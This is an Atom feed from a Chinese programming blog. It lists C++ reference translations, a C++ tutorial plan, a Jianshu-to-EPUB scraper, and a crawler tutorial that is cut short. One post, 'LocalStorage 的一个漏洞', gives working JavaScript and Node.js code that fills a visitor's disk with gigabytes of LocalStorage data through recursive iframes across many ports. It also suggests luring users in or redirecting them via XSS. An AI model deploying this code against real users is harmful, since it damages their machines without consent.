<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>龙哥盟</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.flygon.net/"/>
  <updated>2016-02-07T14:37:18.632Z</updated>
  <id>http://www.flygon.net/</id>
  
  <author>
    <name>Flygon</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>C++参考的翻译或校对</title>
    <link href="http://www.flygon.net/Cpp%E5%8F%82%E8%80%83%E7%9A%84%E7%BF%BB%E8%AF%91%E6%88%96%E6%A0%A1%E5%AF%B9/"/>
    <id>http://www.flygon.net/Cpp参考的翻译或校对/</id>
    <published>2016-02-07T14:03:41.000Z</published>
    <updated>2016-02-07T14:37:18.632Z</updated>
    
    <content type="html">&lt;p&gt;做新年规划的时候，我说过要翻译C++常用类的参考。C++的参考，其实别人已经翻译完了，只是部分内容需要校对。由于网站结构中大量使用了模板，同一个函数只需要翻译一个地方，所以四天就弄完了。而且我没有翻译函数层级的页面，所以比较快。&lt;/p&gt;
&lt;p&gt;C++的参考其实最需要翻译。因为C++为了填C继承过来的坑，标准库增加了很多用于替代的设施。而国内的教程更新缓慢，这份参考如果不翻译，我估计到了2020年也不会完全普及。&lt;/p&gt;
&lt;p&gt;以下是校对完成的类，希望大家继续参与：&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/memory&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;&amp;lt;memory&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/memory/unique_ptr&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;unique_ptr&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/memory/shared_ptr&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;shared_ptr&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/memory/weak_ptr&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;weak_ptr&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/chrono&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;&amp;lt;chrono&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/chrono/duration&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;duration&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/utility/functional&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;&amp;lt;functional&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/utility/functional/function&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;function&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;utility&amp;gt;&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/utility/pair&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;pair&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/utility/tuple&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;tuple&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;字符串&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/string/basic_string&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;basic_string&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/string/byte&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Null结尾的单字节字符串&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/string/multibyte&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Null结尾的多字节字符串&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/string/wide&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Null结尾的宽字符串&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;容器&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/array&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;array&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/vector&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;vector&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/deque&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;deque&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/list&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;list&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/forward_list&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;forward_list&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/set&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;set&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/multiset&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;multiset&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/map&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;map&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/multimap&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;multimap&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/unordered_set&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;unordered_set&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/unordered_multiset&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;unordered_multiset&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/unordered_map&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;unordered_map&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/unordered_multimap&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;unordered_multimap&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/stack&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;stack&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/queue&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;queue&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/container/priority_queue&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;priority_queue&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/utility/bitset&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;bitset&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;I/O&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/io/ios_base&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;ios_base&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/io/basic_ios&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;basic_ios&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/io/basic_istream&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;basic_istream&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/io/basic_ostream&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;basic_ostream&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/io/basic_iostream&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;basic_iostream&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/io/basic_ifstream&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;basic_ifstream&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/io/basic_ofstream&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;basic_ofstream&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/io/basic_fstream&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;basic_fstream&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/io/basic_istringstream&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;basic_istringstream&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/io/basic_ostringstream&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;basic_ostringstream&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/io/basic_stringstream&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;basic_stringstream&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/regex&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;&amp;lt;regex&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/regex/basic_regex&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;basic_regex&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/regex/match_results&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;match_results&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/atomic&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;&amp;lt;atomic&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/numeric&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;数值库&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/numeric/ratio/ratio&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;ratio&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/numeric/math&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;&amp;lt;cmath&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/numeric/complex&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;complex&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/numeric/valarray&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;code&gt;valarray&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/iterator&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;迭代器库&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zh.cppreference.com/w/cpp/algorithm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;算法库&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;http://zh.cppreference.com/w/Special:%E7%94%A8%E6%88%B7%E8%B4%A1%E7%8C%AE/Wizardforcel&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;我的贡献列表&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;做新年规划的时候，我说过要翻译C++常用类的参考。C++的参考，其实别人已经翻译完了，只是部分内容需要校对。由于网站结构中大量使用了模板，同一个函数只需要翻译一个地方，所以四天就弄完了。而且我没有翻译函数层级的页面，所以比较快。&lt;/p&gt;
&lt;p&gt;C++的参考其实最需要翻译。因为C++为了填C继承过来的坑，标准库增加了很多用于替代的设施。而国内的教程更新缓慢，这份参考如果不翻译，我估计到了2020年也不会完全普及。&lt;/p&gt;
&lt;p&gt;以下是校对完成的类，希望大家继续参与：
    
    </summary>
    
      <category term="编程" scheme="http://www.flygon.net/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="cpp" scheme="http://www.flygon.net/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>LocalStorage 的一个漏洞</title>
    <link href="http://www.flygon.net/LocalStorage-%E7%9A%84%E4%B8%80%E4%B8%AA%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.flygon.net/LocalStorage-的一个漏洞/</id>
    <published>2016-02-07T13:12:04.000Z</published>
    <updated>2016-02-07T13:14:09.479Z</updated>
    
    <content type="html">&lt;p&gt;LocalStorage 是 html5 的本地存储，其中的内容以文件的形式保存在本地磁盘中。&lt;/p&gt;
&lt;p&gt;一个域（协议+域名+端口）的文件大小PC端为5~10M，移动端不大于2.5M。&lt;/p&gt;
&lt;p&gt;但是我们可以在端口上做点手脚，因为端口是可控的，我们可以开一个服务器监听很多个端口，然后输出的页面使用iframe进行递归包含。&lt;/p&gt;
&lt;p&gt;比如我们的页面可以嵌入以下代码：&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(function()&amp;#123;&amp;#10;&amp;#160; &amp;#160; var maxPort = ...;&amp;#10;&amp;#10;&amp;#160; &amp;#160; // &amp;#20889;&amp;#25991;&amp;#20214;&amp;#10;&amp;#160; &amp;#160; var s = &amp;#34;&amp;#34;;&amp;#10;&amp;#160; &amp;#160; for(var i=0; i&amp;#60; 3 * 1024 * 1024; i++)&amp;#123;&amp;#10;&amp;#160; &amp;#160;&amp;#160; &amp;#160;&amp;#160;&amp;#160;s += &amp;#34;0&amp;#34;;&amp;#10;&amp;#160; &amp;#160; &amp;#125;&amp;#10;&amp;#160; &amp;#160; localStorage.setItem(&amp;#39;k&amp;#39;, s);&amp;#10;&amp;#10;&amp;#160; &amp;#160; var port = parseInt(location.port) + 1;&amp;#10;&amp;#160; &amp;#160; if(port &amp;#62; maxPort) return;&amp;#10;&amp;#10;&amp;#160; &amp;#160; if(port % 50 == 0)&amp;#123;&amp;#10;&amp;#160; &amp;#160;&amp;#160; &amp;#160;&amp;#160;&amp;#160;//&amp;#27599;50&amp;#20010;&amp;#37325;&amp;#23450;&amp;#21521;&amp;#19968;&amp;#27425;&amp;#65292;&amp;#38450;&amp;#27490;&amp;#23849;&amp;#28291;&amp;#10;&amp;#160; &amp;#160;&amp;#160; &amp;#160;&amp;#160;&amp;#160;window.location.href = url;&amp;#10;&amp;#160; &amp;#160; &amp;#125; else &amp;#123;&amp;#10;&amp;#160; &amp;#160;&amp;#160; &amp;#160;&amp;#160;&amp;#160;// &amp;#26032;&amp;#28155;&amp;#21152;iframe&amp;#10;&amp;#160; &amp;#160;&amp;#160; &amp;#160;&amp;#160;&amp;#160;var url = &amp;#34;http://example.com:&amp;#34; + port;&amp;#10;&amp;#160; &amp;#160;&amp;#160; &amp;#160;&amp;#160;&amp;#160;var $iframe = document.createElement(&amp;#34;iframe&amp;#34;);&amp;#10;&amp;#160; &amp;#160;&amp;#160; &amp;#160;&amp;#160;&amp;#160;$iframe.src = url;&amp;#10;&amp;#160; &amp;#160;&amp;#160; &amp;#160;&amp;#160;&amp;#160;document.getElementsByTagName(&amp;#34;body&amp;#34;)[0].appendChild($iframe);&amp;#10;&amp;#160; &amp;#160; &amp;#125;&amp;#10;&amp;#125;)();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;之后我们用Node.js架设服务器：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var http = require(&amp;#39;http&amp;#39;);&amp;#10;var fs = require(&amp;#39;fs&amp;#39;);&amp;#10;&amp;#10;var content = fs.readFileSync(&amp;#39;./index.html&amp;#39;);&amp;#10;&amp;#10;var maxPort = ...;&amp;#10;&amp;#10;for(var port = 1000; port &amp;#60; maxPort; port++)&amp;#123;&amp;#10;&amp;#160; &amp;#160; http.createServer(function (request, response) &amp;#123;&amp;#10;&amp;#160; &amp;#160;&amp;#160; &amp;#160;&amp;#160;&amp;#160;response.writeHead(200, &amp;#123; &amp;#39;Content-Type&amp;#39; : &amp;#39;text/html; charset=UTF-8&amp;#39; &amp;#125;);&amp;#10;&amp;#160; &amp;#160;&amp;#160; &amp;#160;&amp;#160;&amp;#160;response.write(content);&amp;#10;&amp;#160; &amp;#160;&amp;#160; &amp;#160;&amp;#160;&amp;#160;response.end();&amp;#10;&amp;#160; &amp;#160; &amp;#125;).listen(port);&amp;#10;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们可以给页面加点装饰，诱导用户点击。也可以使用现有的XSS漏洞重定向过去。&lt;/p&gt;
&lt;p&gt;测试结果&lt;/p&gt;
&lt;p&gt;100个端口有几乎500MB&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://litten.github.io/assets/blogImg/localstorage3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;200个端口则有1.17个G&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://litten.github.io/assets/blogImg/localstorage4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如果将端口调整至2000个&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://litten.github.io/assets/blogImg/localstorage5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;GG。&lt;/p&gt;
&lt;p&gt;注&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;http://litten.github.io/2015/07/06/hack-in-localstorage/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;作为一个前端，可以如何机智地弄坏一台电脑？&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;LocalStorage 是 html5 的本地存储，其中的内容以文件的形式保存在本地磁盘中。&lt;/p&gt;
&lt;p&gt;一个域（协议+域名+端口）的文件大小PC端为5~10M，移动端不大于2.5M。&lt;/p&gt;
&lt;p&gt;但是我们可以在端口上做点手脚，因为端口是可控的，我们可以开一个服务器监听很多个端口，然后输出的页面使用iframe进行递归包含。&lt;/p&gt;
&lt;p&gt;比如我们的页面可以嵌入以下代码：
    
    </summary>
    
      <category term="安全" scheme="http://www.flygon.net/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="html5" scheme="http://www.flygon.net/tags/html5/"/>
    
  </entry>
  
  <entry>
    <title>本人的“深入理解c++”系列规划</title>
    <link href="http://www.flygon.net/%E6%9C%AC%E4%BA%BA%E7%9A%84%E2%80%9C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3c++%E2%80%9D%E7%B3%BB%E5%88%97%E8%A7%84%E5%88%92/"/>
    <id>http://www.flygon.net/本人的“深入理解c++”系列规划/</id>
    <published>2016-01-30T11:40:58.000Z</published>
    <updated>2016-02-07T11:41:29.635Z</updated>
    
    <content type="html">&lt;p&gt;第一部分是标准库的新增设施，主要是结合tr1、tr2、tr3的设施，讲解如何快速高效的开发C++应用。在这一部分我会用C++的新增设施去翻写posix api或者Java的一些代码来讲解。&lt;/p&gt;
&lt;p&gt;第二部分是底层和黑魔法。主要是底层操作、宏操作（实现属性、实现meta）、hook、dll和com互操作等。可以说互操作是C++的优势之一，其它语言的组件只能做进程级别的调用，但是C++写出来的动态库可以做模块级别的调用。&lt;/p&gt;
&lt;p&gt;第三部分是应用，注重标准库没有的东西，比如调用webkit编写跨平台的ui，基于web框架的web开发（模板、orm、json、db、wsgi）。&lt;/p&gt;
&lt;p&gt;由于第一部分和第三部分需要等到boost.asio完全加入标准库，还需要等个几年吧。所以近期大家就不要有太大期望了。&lt;/p&gt;
&lt;p&gt;注意：本教程仅仅是计划中的。如果C#Native在17年之前登陆PC，或者Swift迁移到了Windows平台，则该计划作废。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;第一部分是标准库的新增设施，主要是结合tr1、tr2、tr3的设施，讲解如何快速高效的开发C++应用。在这一部分我会用C++的新增设施去翻写posix api或者Java的一些代码来讲解。&lt;/p&gt;
&lt;p&gt;第二部分是底层和黑魔法。主要是底层操作、宏操作（实现属性、实现meta
    
    </summary>
    
      <category term="编程" scheme="http://www.flygon.net/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>【好东西】简书助手</title>
    <link href="http://www.flygon.net/%E5%A5%BD%E4%B8%9C%E8%A5%BF-%E7%AE%80%E4%B9%A6%E5%8A%A9%E6%89%8B/"/>
    <id>http://www.flygon.net/好东西-简书助手/</id>
    <published>2016-01-27T11:39:47.000Z</published>
    <updated>2016-02-07T11:40:36.516Z</updated>
    
    <content type="html">&lt;p&gt;爬取简书的文章，并生成EPUB格式。&lt;/p&gt;
&lt;h2 id=&quot;u7528_u6CD5&quot;&gt;&lt;a href=&quot;#u7528_u6CD5&quot; class=&quot;headerlink&quot; title=&quot;用法&quot;&gt;&lt;/a&gt;用法&lt;/h2&gt;&lt;p&gt;首先到官网下载并安装node.js。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https://github.com/wizardforcel/jianhelper.git&amp;#10;cd jianhelper&amp;#10;npm install&amp;#10;node jianhelper url [start [end]]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;url：支持三种类型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.jianshu.com/users/{id}&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.jianshu.com/users/{id}&lt;/a&gt; 用户&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.jianshu.com/notebooks/{id}&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.jianshu.com/notebooks/{id}&lt;/a&gt; 文集&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.jianshu.com/collection/{id}&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.jianshu.com/collection/{id}&lt;/a&gt; 专题&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;start：起始页，默认为第一页&lt;/p&gt;
&lt;p&gt;end：终止页，默认为最后一页&lt;/p&gt;
&lt;h2 id=&quot;TODO&quot;&gt;&lt;a href=&quot;#TODO&quot; class=&quot;headerlink&quot; title=&quot;TODO&quot;&gt;&lt;/a&gt;TODO&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;添加标题、封面&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;u534F_u8BAE&quot;&gt;&lt;a href=&quot;#u534F_u8BAE&quot; class=&quot;headerlink&quot; title=&quot;协议&quot;&gt;&lt;/a&gt;协议&lt;/h2&gt;&lt;p&gt;MIT-LICENSE&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;爬取简书的文章，并生成EPUB格式。&lt;/p&gt;
&lt;h2 id=&quot;u7528_u6CD5&quot;&gt;&lt;a href=&quot;#u7528_u6CD5&quot; class=&quot;headerlink&quot; title=&quot;用法&quot;&gt;&lt;/a&gt;用法&lt;/h2&gt;&lt;p&gt;首先到官网下载并安装node.js。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https://github.com/wizardforcel/jianhelper.git&amp;#10;cd jianhelper&amp;#10;npm install&amp;#10;node jianhelper url [start [end]]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="应用" scheme="http://www.flygon.net/categories/%E5%BA%94%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>使用sync-request和cheerio写爬虫</title>
    <link href="http://www.flygon.net/%E4%BD%BF%E7%94%A8sync-request%E5%92%8Ccheerio%E5%86%99%E7%88%AC%E8%99%AB/"/>
    <id>http://www.flygon.net/使用sync-request和cheerio写爬虫/</id>
    <published>2016-01-22T11:38:27.000Z</published>
    <updated>2016-02-07T11:39:29.004Z</updated>
    
    <content type="html">&lt;p&gt;node.js自带的http模块是异步获取网页内容的，不过我们可以到npm上去搜索同步的http模块。sync-request就是其中一种。&lt;/p&gt;
&lt;p&gt;首先，安装sync-request包：&lt;/p&gt;
